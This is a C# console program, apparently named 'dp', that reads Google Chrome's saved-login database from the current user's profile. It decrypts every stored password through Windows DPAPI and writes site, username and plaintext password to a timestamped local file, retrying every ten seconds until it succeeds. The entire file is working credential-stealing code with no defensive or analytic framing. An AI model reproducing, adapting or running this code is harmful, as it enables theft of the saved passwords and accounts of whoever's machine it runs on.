using System;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace dp
{

    class Program
    {
        private static bool _IsWhile { get; set; } = true;

        static void Main(string[] args)
        {
            try
            {


                Console.WriteLine("[dp] => APPLICATION STARTED");

                string file_output_name = "dp_log__" + DateTime.Now.ToString("(MM.dd.yy_H.mm.ss)") + ".dp";

                Console.WriteLine("[dp] => OUTPUT FILE NAME: " + file_output_name);

                while (_IsWhile)
                {
                    try
                    {

                        string description, returnData = null;

                        // ==================
                        string database_way = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\..\Local\Google\Chrome\User Data\Default\Login Data";
                        string connectionString = "data source=" + database_way + ";New=True;UseUTF16Encoding=True";

                        // ==================
                        SQLiteConnection sqlConnection = new SQLiteConnection(connectionString);
                        
                        SQLiteCommand sqlCommand = new SQLiteCommand("SELECT * FROM logins", sqlConnection);
                        SQLiteDataAdapter sqlDataAdapter = new SQLiteDataAdapter(sqlCommand);

                        DataTable dataTable = new DataTable();
                        sqlDataAdapter.Fill(dataTable);

                        for (int i = 0; i < dataTable.Rows.Count; i++)
                        {
                            returnData = String.Concat(returnData,
                                dataTable.Rows[i][1] + ":" +
                                dataTable.Rows[i][3] + ":" +
                                Encoding.UTF8.GetString(DPAPI.Decrypt((byte[])dataTable.Rows[i][5], Encoding.UTF8.GetBytes(String.Empty), out description)) +
                                "\r\n");
                        }

                        // ==================
                        File.WriteAllText(file_output_name, returnData);
                        _IsWhile = false;

                        Console.WriteLine("[dp][while] => FINALLY :: ROWS => " + dataTable.Rows.Count);
                    }
                    catch (Exception exception)
                    {
                        Console.WriteLine("[dp][Exception][while] => " + exception.Message);
                        Console.WriteLine("[dp][Exception::Info][while] => Restart : 10s");
                        Thread.Sleep(10000);
                    }
                }

            }
            catch (Exception exception)
            {
                Console.WriteLine("[dp][Exception] => " + exception.Message);
            }
            finally
            {
                Console.ReadLine();
            }
        }
    }
}
